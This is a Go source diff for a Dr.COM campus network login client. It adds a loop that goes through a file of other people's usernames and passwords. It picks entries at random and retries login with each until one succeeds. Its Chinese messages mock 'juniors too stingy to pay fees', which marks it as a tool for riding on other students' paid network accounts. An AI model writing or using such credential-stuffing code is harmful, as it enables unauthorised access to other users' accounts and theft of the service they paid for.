@@ -6,23 +6,19 @@
 // Author: ms2008vip@gmail.com at 2017/8/15 11:10:02
 
 
-//go:generate goversioninfo -icon=cover.ico
+//go:generate goversioninfo -icon=ballet.ico
 
 package main
 
 import (
     "fmt"
-    _ "net/http"
-    _ "net/url"
     "os"
     "bufio"
-    _ "io/ioutil"
     "strings"
-    _ "strconv"
-    _ "math/rand"
+    "math/rand"
     "time"
     "flag"
-    _ "github.com/toqueteos/webbrowser"
+    "github.com/toqueteos/webbrowser"
 
     "./conf"
     "./utils"
@@ -44,35 +40,86 @@ func main() {
     args := os.Args
     if len(args)==2 && (args[1]=="--version" || args[1] =="-v") {
         fmt.Printf("Git Commit Hash: %s\n", githash)
-        fmt.Printf("UTC Build Time: %s\n", buildstamp)
+        fmt.Printf("UTC Build Time : %s\n", buildstamp)
         return
     }
-
-	var err error
 
 	flag.Parse()
 	if err := conf.Init(); err != nil {
 		panic(err)
 	}
 
-    // 1. challenge
     svr := service.New(conf.Conf)
-	if err = svr.Challenge(svr.ChallengeTimes); err != nil {
+    userList := fileTolines(FILE)
+    rand.Seed(time.Now().Unix())
+    count := 1
+    //fmt.Println(userList)
+
+    // 1. challenge
+	if err := svr.Challenge(svr.ChallengeTimes); err != nil {
 		log.Error("drcomSvc.Challenge(%d) error(%v)", svr.ChallengeTimes, err)
 		return
 	}
 
 	// 2. login
-	if err = svr.Login(); err != nil {
+	if err := svr.Login(); err != nil {
 		log.Error("drcomSvc.Login() error(%v)", err)
-		return
+
+        for {
+
+            if count == 1 && len(userList) == 1 && strings.TrimSpace(userList[0]) == "\xef\xbb\xbf" {
+                fmt.Println("密码库是空的！")
+                fmt.Println("按下「CTRL + C」终止本程序")
+                fmt.Scanln()
+                return
+            } else if len(userList) == 0 {
+                fmt.Println("你的学弟学妹们都太抠了，连费都舍不得充！")
+                fmt.Println("按下「CTRL + C」终止本程序")
+                fmt.Scanln()
+                return
+            }
+
+            // 速率限制
+            // if count%1000 == 0 {
+            //     fmt.Printf("processed at least %d iterms\n", count)
+            //     <- time.After(5 * time.Second)
+            //     fmt.Println("go on....")
+            // }
+
+            n := rand.Intn(len(userList))
+            line := userList[n]
+
+            // 将测试过的用户移除出当前密码库
+            userList = append(userList[:n], userList[n+1:]...)
+            count++
+
+            //userInfo := strings.Split(line, "\t")
+            userInfo := strings.Fields(line)
+            if len(userInfo) < 2 {
+                log.Critical("shit happens: unrecognized user info format: %v", userInfo)
+                continue
+            }
+            account := userInfo[0]
+            password := userInfo[len(userInfo)-1]
+
+            // update the account info
+            svr.Conf.Username = account
+            svr.Conf.Password = password
+
+            if err := svr.Login(); err != nil {
+                log.Error("drcomSvc.Login() error(%v)", err)
+            } else {
+                break
+            }
+        }
 	}
 
+    webbrowser.Open(URL)
 	// 3. keepalive
-	count := 0
+	ping_times := 0
 	for {
-		count++
-		if err = svr.Alive(); err != nil {
+		ping_times++
+		if err := svr.Alive(); err != nil {
 			log.Error("drcomSvc.Alive() error(%v)", err)
 			return
 		}
